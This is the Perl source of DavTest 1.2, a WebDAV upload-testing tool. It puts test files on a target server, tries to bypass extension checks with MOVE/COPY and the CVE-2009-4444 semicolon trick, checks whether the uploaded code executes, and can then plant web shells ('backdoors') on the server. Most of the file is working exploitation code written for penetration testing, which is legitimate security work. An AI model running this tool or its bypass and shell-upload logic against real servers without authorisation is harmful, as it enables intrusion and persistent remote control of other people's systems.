#!/usr/bin/perl
########################################################################
# Copyright 2015 Websec, SC.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################
# 1.2 Author: RewardOne (github.com/rewardone)
# 1.1 Author:	Paulino Calderon (calderon[at]websec[.]mx)
# 1.0 Author:   Chris Sullo (csullo [at] sunera [.] com)
#                 http://security.sunera.com/
#
# Program Name:		DavTest
# Purpose:		Perform upload testing of WebDAV enabled servers
# Version:		1.2
# Code Repo:
# Dependencies:
#			HTTP::DAV
#			HTTP::Request
#			Getopt::Long
#
# CHANGELOG:
# 1.2 - Added initial MOVE and COPY support. Added bypass testing for CVE-2009-4444
# 1.1 - Fixed auth and added realm support
#
# Known Bugs / Defficiencies:
# Auth support for bypass raw_exec_check not implemented nor tested
# Backdoor/Uploadfile functionality using MOVE/COPY bypass not implemented
#   Workaround: send your request and manually issue MOVE/COPY
# Running -move and -copy at the same time results in 401 Not Authorized.
#   Workaround: run modes separately
#
########################################################################

use strict;
use HTTP::DAV;
use HTTP::Request;
use Getopt::Long;
use Net::SSL;
use Crypt::SSLeay;

# cli options
use vars qw/%OPTIONS %RESULTS $dav/;
parse_options();

# initial values
my $filesid = new_sid($OPTIONS{'rand'});
my %tests   = generate_tests($filesid);
$RESULTS{'havesuccess'} = 0;
$RESULTS{'createddir'}  = 0;

###########################################
# Test connection
print "********************************************************\n" unless $OPTIONS{'quiet'};
print " Testing DAV connection\n"                                  unless $OPTIONS{'quiet'};
$dav = HTTP::DAV->new();
$dav->get_user_agent->ssl_opts(verify_hostname => 0);

if ($OPTIONS{'debug'} ne '') {
    $dav->DebugLevel($OPTIONS{'debug'});
    }

if ($OPTIONS{'user'} ne '') {
    set_creds($OPTIONS{'url'}, $OPTIONS{'user'}, $OPTIONS{'pass'}, $OPTIONS{'realm'});
    }

if ($dav->open(-url => $OPTIONS{'url'})) {
    print "OPEN\t\tSUCCEED:\t\t$OPTIONS{'url'}\n" unless $OPTIONS{'quiet'};
    }
else {
    print STDERR "OPEN\t\tFAIL:\t$OPTIONS{'url'}\t" . $dav->message . "\n";
    exit;
    }

###########################################
if ($OPTIONS{'uploadfile'} ne '') {
    print "********************************************************\n unless $OPTIONS{'quiet'}";
    print " Uploading file\n" unless $OPTIONS{'quiet'};
    if (put_local_file("$OPTIONS{'url'}/$OPTIONS{'uploadloc'}", $OPTIONS{'uploadfile'})) {
        print "Upload succeeded: $OPTIONS{'url'}/$OPTIONS{'uploadloc'}\n";
        }
    else {
        print STDERR "Upload failed: " . $dav->message . "\n";
        }
    exit;
    }

###########################################
# let user know the sid
print "********************************************************\n" unless $OPTIONS{'quiet'};
print "NOTE\tRandom string for this session: $filesid\n"           unless $OPTIONS{'quiet'};

# Make new directory
if ($OPTIONS{'createdir'}) {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Creating directory\n"                                      unless $OPTIONS{'quiet'};
    if ($OPTIONS{'newdir'} eq '') {
        $OPTIONS{'newdir'} = "DavTestDir_" . $filesid;
        }
    else {
        $OPTIONS{'newdir'} = $OPTIONS{'newdir'};
        }
    my $newbase = $OPTIONS{'url'};
    if ($dav->mkcol(-url => "$OPTIONS{'url'}/$OPTIONS{'newdir'}")) {
        print "MKCOL\t\tSUCCEED:\t\tCreated $OPTIONS{'url'}/$OPTIONS{'newdir'}\n"
          unless $OPTIONS{'quiet'};
        $RESULTS{'summary'} .= "Created: $OPTIONS{'url'}/$OPTIONS{'newdir'}\n";
        $newbase = "$OPTIONS{'url'}/$OPTIONS{'newdir'}";
        $RESULTS{'createddir'} = 1;
        }
    else {
        print "MKCOL\t\tFAIL\n";
        }

    # close old conn
    $dav->unlock(-url => $OPTIONS{'url'});
    $OPTIONS{'url'} = $newbase;

    # reopen new base
    if ($OPTIONS{'user'} ne '') {
        set_creds($OPTIONS{'url'}, $OPTIONS{'user'}, $OPTIONS{'pass'}, $OPTIONS{'realm'});
        }

    if (!$dav->open(-url => $OPTIONS{'url'})) {
        print STDERR "OPEN\t\tFAIL\tFailed to open new base $OPTIONS{'url'}\n";
        exit;
        }
    }

###########################################
# put test files
if (!$OPTIONS{'move'} && !$OPTIONS{'copy'}) {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Sending test files\n"                                      unless $OPTIONS{'quiet'};
    foreach my $type (keys %tests) {
        if (put_file("$OPTIONS{'url'}/$tests{$type}->{'filename'}", $tests{$type}->{'content'})) {
            print "PUT\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
              unless $OPTIONS{'quiet'};
            $RESULTS{'summary'} .= "PUT File: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
            $RESULTS{'havesuccess'} = 1;
            $tests{$type}->{'result'} = 1;
            }
        else {
            print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
            }
        }
    }

###########################################
# put test files via move
if ($OPTIONS{'move'}) {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Sending test files (MOVE method)\n"                        unless $OPTIONS{'quiet'};
    foreach my $type (keys %tests) {
        my $oext    = get_ext($tests{$type}->{'filename'});
        my $txtfile = $tests{$type}->{'filename'};
        $txtfile =~ s/\.$oext$/_$oext\.txt/;
        my $bypassfile = $tests{$type}->{'filename'};
        $bypassfile =~ s/\.$oext$/\.$oext\;\.txt/;

        if (put_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'content'})) {
            print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n" unless $OPTIONS{'quiet'};

            # now move it
            if (move_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'filename'})) {
                print "MOVE\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
                  unless $OPTIONS{'quiet'};
                $RESULTS{'summary'} .=
                  "MOVE/PUT File: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
                $RESULTS{'havesuccess'} = 1;
                $tests{$type}->{'result'} = 1;
                }
            else {
                print STDERR "MOVE\t$type\tFAIL\n";
                }
            }
        else {
            print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
            }

        # I don't know perl, so this is not optimized
        # PUT the file again in case the last MOVE succeeded (original file would no longer exist)
        if (put_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'content'})) {
            #Comment to decrease noise. If first PUT fails, this will too.
            #print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n" unless $OPTIONS{'quiet'};

            # now move it
            if (move_file("$OPTIONS{'url'}/$txtfile", $bypassfile)) {
                print "MOVE\t$type\tSUCCEED:\t$OPTIONS{'url'}/$bypassfile\n"
                  unless $OPTIONS{'quiet'};
                $RESULTS{'summary'} .=
                  "MOVE/PUT File: $OPTIONS{'url'}/$bypassfile\n";
                $RESULTS{'havesuccess'} = 1;
                $tests{$type}->{'result'} = 1;
                }
            else {
                print STDERR "MOVE\t$type\tFAIL\t\tWITH BYPASS\n";
                }
            }
        else {
            #Comment to decrease noise. If first PUT fails, this will too.
            #print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
            }
        }
    }

###########################################
# put test files via copy
if ($OPTIONS{'copy'}) {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Sending test files (COPY method)\n"                        unless $OPTIONS{'quiet'};
    foreach my $type (keys %tests) {
        my $oext    = get_ext($tests{$type}->{'filename'});
        my $txtfile = $tests{$type}->{'filename'};
        $txtfile =~ s/\.$oext$/_$oext\.txt/;
        my $bypassfile = $tests{$type}->{'filename'};
        $bypassfile =~ s/\.$oext$/\.$oext\;\.txt/;

        if (put_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'content'})) {
            print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n" unless $OPTIONS{'quiet'};

            # now copy it
            if (copy_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'filename'})) {
                print "COPY\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
                  unless $OPTIONS{'quiet'};
                $RESULTS{'summary'} .=
                  "COPY/PUT File: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
                $RESULTS{'havesuccess'} = 1;
                $tests{$type}->{'result'} = 1;
                }
            else {
                print STDERR "COPY\t$type\tFAIL\n";
                }

            # now copy it
            if (copy_file("$OPTIONS{'url'}/$txtfile", $bypassfile)) {
                print "COPY\t$type\tSUCCEED:\t$OPTIONS{'url'}/$bypassfile\n"
                  unless $OPTIONS{'quiet'};
                $RESULTS{'summary'} .=
                  "COPY/PUT File: $OPTIONS{'url'}/$bypassfile\n";
                $RESULTS{'havesuccess'} = 1;
                $tests{$type}->{'result'} = 1;
                }
            else {
                print STDERR "COPY\t$type\tFAIL\t\tWITH BYPASS\n";
                }
            }
        else {
            print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
            }
        }
    }

###########################################
# Check to see if code executed
if ($RESULTS{'havesuccess'}) {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Checking for test file execution\n"                        unless $OPTIONS{'quiet'};
    foreach my $type (keys %tests) {
        if ($tests{$type}->{'result'} eq 1) {
            my $oext    = get_ext($tests{$type}->{'filename'});
            my $bypassfile = $tests{$type}->{'filename'};
            $bypassfile =~ s/\.$oext$/\.$oext\;\.txt/;
            if (check_exec("$OPTIONS{'url'}/$tests{$type}->{'filename'}",
                           $tests{$type}->{'execmatch'}
                           )
                ) {
                $tests{$type}->{'execute'} = 1;
                print "EXEC\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
                  unless $OPTIONS{'quiet'};
                $RESULTS{'summary'} .= "Executes: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
                }
            if (check_exec("$OPTIONS{'url'}/$bypassfile",
                       $tests{$type}->{'execmatch'}
                       ) ||
                       raw_check_exec("$OPTIONS{'url'}/$bypassfile",
                       $tests{$type}->{'execmatch'}
                       )
                ) {
                $tests{$type}->{'execute'} = 1;
                print "EXEC\t$type\tSUCCEED:\t$OPTIONS{'url'}/$bypassfile\n"
                  unless $OPTIONS{'quiet'};
                $RESULTS{'summary'} .= "Executes: $OPTIONS{'url'}/$bypassfile\n";
                }
            else {
                $tests{$type}->{'execute'} = 0;
                print "EXEC\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
                }
            }
        else {
            $tests{$type}->{'execute'} = 0;
            }
        }
    }

###########################################
# Create shells
if ($OPTIONS{'sendbackdoors'} ne '') {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Sending backdoors\n"                                       unless $OPTIONS{'quiet'};
    foreach my $type (keys %tests) {
        if ($tests{$type}->{'execute'} eq 1) {
            if (($OPTIONS{'sendbackdoors'} eq $type) || ($OPTIONS{'sendbackdoors'} eq 'auto')) {
                my @files = dirlist("backdoors/", ".*\.$type");
                if ($files[0] eq '') {
                    print STDERR "** ERROR: Unable to find a backdoor for $type **\n"
                      unless $OPTIONS{'quiet'};
                    }
                else {
                    for (my $i = 0 ; $i <= $#files ; $i++) {
                        if ($OPTIONS{'move'}) {
                            my $oext    = get_ext($files[$i]);
                            my $txtfile = $filesid . $files[$i];
                            if ($filesid ne '') { $txtfile = $filesid . "_" . $txtfile; }
                            $txtfile =~ s/\.$oext$/_$oext\.txt/;
                            if (put_local_file("$OPTIONS{'url'}/$txtfile", "backdoors/$files[$i]"))
                            {
                                print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n"
                                  unless $OPTIONS{'quiet'};

                                # now move it
                                if (move_file("$OPTIONS{'url'}/$txtfile",
                                              "$OPTIONS{'url'}/$files[$i]"
                                              )
                                    ) {
                                    print
                                      "MOVE Shell:\t$type\tSUCCEED:\t$OPTIONS{'url'}/$files[$i]\n"
                                      unless $OPTIONS{'quiet'};
                                    $RESULTS{'summary'} .=
                                      "MOVE/PUT Shell: $OPTIONS{'url'}/$files[$i]\n";
                                    $RESULTS{'backdoors'} = 1;
                                    }
                                else {
                                    print STDERR "MOVE\t$type\tFAIL\n";
                                    }
                                }

                            }
                        else {
                            my $putfile = $files[$i];
                            if ($filesid ne '') { $putfile = $filesid . "_" . $putfile; }
                            if (put_local_file("$OPTIONS{'url'}/$putfile", "backdoors/$files[$i]"))
                            {
                                print "PUT Shell:\t$type\tSUCCEED:\t$OPTIONS{'url'}/$putfile\n"
                                  unless $OPTIONS{'quiet'};
                                $RESULTS{'summary'} .= "PUT Shell: $OPTIONS{'url'}/$putfile\n";
                                $RESULTS{'backdoors'} = 1;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

###########################################
# cleanup
if ($OPTIONS{'cleanup'}) {
    print "********************************************************\n" unless $OPTIONS{'quiet'};
    print " Cleaning up\n"                                             unless $OPTIONS{'quiet'};
    if ($RESULTS{'createddir'} && !($RESULTS{'backdoors'})) {
        if (delete_file($OPTIONS{'url'})) {
            print "DELETE\t\tSUCCEED:\t$OPTIONS{'url'}\n" unless $OPTIONS{'quiet'};
            $RESULTS{'summary'} .= "DELETED: $OPTIONS{'url'}\n";
            }
        else {
            print STDERR "DELETE\t\tFAIL:\t$OPTIONS{'url'}\n";
            }
        }
    else {
        foreach my $type (keys %tests) {

            # only try if test succeeded
            if ($tests{$type}->{'result'} eq 1) {
                if (delete_file("$OPTIONS{'url'}/$tests{$type}->{'filename'}")) {
                    print "DELETE\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
                      unless $OPTIONS{'quiet'};
                    $RESULTS{'summary'} .= "DELETED: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
                    }
                else {
                    print STDERR "DELETE\t$type\tFAIL\n";
                    }
                }
            }
        }
    }

$dav->unlock(-url => $OPTIONS{'url'});

# Summary
print "\n";
print "********************************************************\n" unless $OPTIONS{'quiet'};
print "$0 Summary:\n";
print $RESULTS{'summary'} . "\n";

exit;

###########################################
sub dirlist {
    my $DIR     = $_[0] || return;
    my $PATTERN = $_[1] || "";
    my @FILES_TMP = ();

    opendir(DIRECTORY, $DIR) || die print STDERR "** ERROR: Can't open directory '$DIR': $@ **\n";
    foreach my $file (readdir(DIRECTORY)) {
        if ($file =~ /^\./) { next; }    # skip hidden files, '.' and '..'
        if ($PATTERN ne "") {
            if ($file =~ /$PATTERN/) { push(@FILES_TMP, $file); }
            }
        else { push(@FILES_TMP, $file); }
        }
    closedir(DIRECTORY);
    return @FILES_TMP;
    }

###########################################
sub set_creds {
    my $url = $_[0] || return;
    my $id  = $_[1] || return;
    my $pw  = $_[2];
    my $realm = $_[3];
    $dav->credentials(-url => $url, -user => $id, -pass => $pw, -realm => $realm);
    return;
    }

###########################################
sub move_file {
    my $sourcefile = $_[0] || return 0;
    my $targetfile = $_[1] || return 0;
    $dav->move($sourcefile, $targetfile) || return 0;
    return 1;
    }

###########################################
sub copy_file {
    my $sourcefile = $_[0] || return 0;
    my $targetfile = $_[1] || return 0;
    $dav->copy($sourcefile, $targetfile) || return 0;
    return 1;
    }

###########################################
sub get_ext {
    my $file = $_[0] || return;
    $file =~ s/^.*\.//;
    return $file;
    }

###########################################
sub check_exec {
    my $url   = $_[0] || return 0;
    my $match = $_[1] || return 0;
    my $contents = "";
    $dav->get($url, \$contents);
    if ($contents =~ /$match/) {
        return 1;
        }
    return 0;
    }

###########################################
#I was only able to test this for the bypass technique
#Reasoning:
# The check_exec function uses HTTP::Dav, which sends a PROPFIND
# request before a GET request. PROPFIND can result in a status
# 403 response when checking for bypassed files (.asp;.txt). This
# causes check_exec to never send a GET request and can miss pages
# that are indeed executable.
#Not Optimized:
# raw_check_exec strips HTML tags. When bypassed, the asp page was
# returning <html><body>49.92 and therefore was not reported as
# success (match is only on 49.92).
#No Authentication:
# Did not spend time adding the headers for auth, but it 'should'
# be simple.
sub raw_check_exec {
    my $url   = $_[0] || return 0;
    my $match = $_[1] || return 0;
    my $contents = "";
    #my $header = stuff here for authenticated DavTests
    my $request = HTTP::Request->new("GET",$url);
    my $ua = LWP::UserAgent->new;
    my $response = $ua->request($request);
    if ($response->is_success) {
      my $htmlCode = $response->decoded_content;
      $htmlCode =~ s|<.+?>||g;
      if ($htmlCode =~ /$match/) {
          return 1;
      }
    }
    else {
        return 0;
    }
    return 0;
    }

###########################################
sub put_local_file {
    my $url      = $_[0] || return 0;
    my $filepath = $_[1] || return 0;
    if (!-r $filepath) {
        print STDERR "** ERROR: $filepath does not exist **\n";
        exit;
        }
    $dav->put(-local => $filepath, -url => $url) or return 0;
    return 1;
    }

###########################################
sub put_file {
    my $url     = $_[0] || return 0;
    my $content = $_[1] || return 0;
    $dav->put(-local => \$content, -url => $url) or return 0;
    return 1;
    }

###########################################
sub delete_file {
    my $url = $_[0] || return 0;
    $dav->delete(-url => $url) or return 0;
    return 1;
    }

###########################################
sub generate_tests {
    my $sid = $_[0];
    my %tests;

    my @files = dirlist("tests/", ".*\.txt");
    foreach my $file (@files) {
        open(TESTFILE, "<tests/$file") || die print "Unable to open '$file': $!\n";
        my $type = $file;
        $type =~ s/\.txt$//;
        $tests{$type}->{'filename'} = "davtest_" . $sid . "." . $type;
        $tests{$type}->{'result'}   = 0;
        $tests{$type}->{'execute'}  = 0;

        while (<TESTFILE>) {
            if ($_ =~ /^#/) { next; }
            chomp;
            $_ =~ /^([^=]+)=(.*)$/;
            my $key   = $1;
            my $value = $2;
            if (($key eq '') || ($value eq '')) {
                delete $tests{$type};
                print STDERR "** ERROR: 'tests/$file' is not a valid test file **\n";
                next;
                }

            # token: $$FILENAME$$ = 'filename'
            $value =~ s/\$\$FILENAME\$\$/$tests{$type}->{'filename'}/gms;

            # embedded newline (perl especailly)
            $value =~ s/\\n/\n/g;

            $tests{$type}->{$key} = $value;
            }
        close(TESTFILE);
        if (($tests{$type}->{'content'} eq '') || ($tests{$type}->{'execmatch'} eq '')) {
            print STDERR "** ERROR: 'tests/$file' is not a valid test file **\n";
            delete $tests{$type};
            }
        }
    return %tests;
    }

###########################################
sub usage {
    print "$_[0]\n";
    print "$0 -url <url> [options]\n";
    print "\n";
    print " -auth+ 	Authorization (user:password)\n";
    print " -realm+ Auth Realm\n";
    print " -cleanup	delete everything uploaded when done\n";
    print " -directory+	postfix portion of directory to create\n";
    print " -debug+	DAV debug level 1-3 (2 & 3 log req/resp to /tmp/perldav_debug.txt)\n";
    print " -move		PUT text files then MOVE to executable\n";
    print " -copy		PUT text files then COPY to executable\n";
    print " -nocreate 	don't create a directory\n";
    print " -quiet	 	only print out summary\n";
    print " -rand+ 	use this instead of a random string for filenames\n";
    print " -sendbd+	send backdoors:\n";
    print "			auto - for any succeeded test\n";
    print "			ext - extension matching file name(s) in backdoors/ dir\n";
    print " -uploadfile+	upload this file (requires -uploadloc)\n";
    print " -uploadloc+	upload file to this relative location/name (requires -uploadfile)\n";
    print " -url+		url of DAV location\n";
    print "\n";
    print "Example: $0 -url http://localhost/davdir\n";
    print "\n";
    exit;
    }

###########################################
sub new_sid {
    if ($_[0] ne '') { return $_[0]; }
    my @chars = ('a' .. 'z', 'A' .. 'Z', '0' .. '9', '_');
    my $random_string;
    foreach (0 .. (rand(10) + 5)) {
        $random_string .= $chars[ rand @chars ];
        }
    return $random_string;
    }

###########################################
sub parse_options {
    GetOptions("nocreate"     => \$OPTIONS{'createdir'},
               "cleanup"      => \$OPTIONS{'cleanup'},
               "debug=s"      => \$OPTIONS{'debug'},
               "move"         => \$OPTIONS{'move'},
               "copy"         => \$OPTIONS{'copy'},
               "rand=s"       => \$OPTIONS{'rand'},
               "sendbd=s"     => \$OPTIONS{'sendbackdoors'},
               "uploadfile=s" => \$OPTIONS{'uploadfile'},
               "uploadloc=s"  => \$OPTIONS{'uploadloc'},
               "directory=s"  => \$OPTIONS{'newdir'},
               "quiet"        => \$OPTIONS{'quiet'},
               "auth=s"       => \$OPTIONS{'authstring'},
               "realm=s"      => \$OPTIONS{'realm'},
               "url=s"        => \$OPTIONS{'url'}
               ) || die usage("^^^^^^^^^^^^^^  ERROR ^^^^^^^^^^^^^^\n");

    # requirements / conflicts
    if ($OPTIONS{'url'} eq '') { usage("\nERROR: Missing -url\n"); }
    if (($OPTIONS{'uploadfile'} ne '') && ($OPTIONS{'uploadloc'} eq '')) {
        usage("\nERROR: Missing -uploadloc\n");
        }
    if (($OPTIONS{'uploadfile'} eq '') && ($OPTIONS{'uploadloc'} ne '')) {
        usage("\nERROR: Missing -uploadfile\n");
        }
    if (($OPTIONS{'debug'} ne '') && ($OPTIONS{'debug'} !~ /^(?:1|2|3)$/)) {
        usage("\nERROR: Invalid debug setting\n");
        }

    # authstring
    if ($OPTIONS{'authstring'} ne '') {
        my @temp = split(/:/, $OPTIONS{'authstring'});
        $OPTIONS{'user'} = $temp[0];
        $OPTIONS{'pass'} = $temp[1];
        }

    # swap the bool logic on this one
    if   ($OPTIONS{'createdir'}) { $OPTIONS{'createdir'} = 0; }
    else                         { $OPTIONS{'createdir'} = 1; }

    $OPTIONS{'url'}    =~ s/\/$//;
    $OPTIONS{'newdir'} =~ s/\/$//;
    }
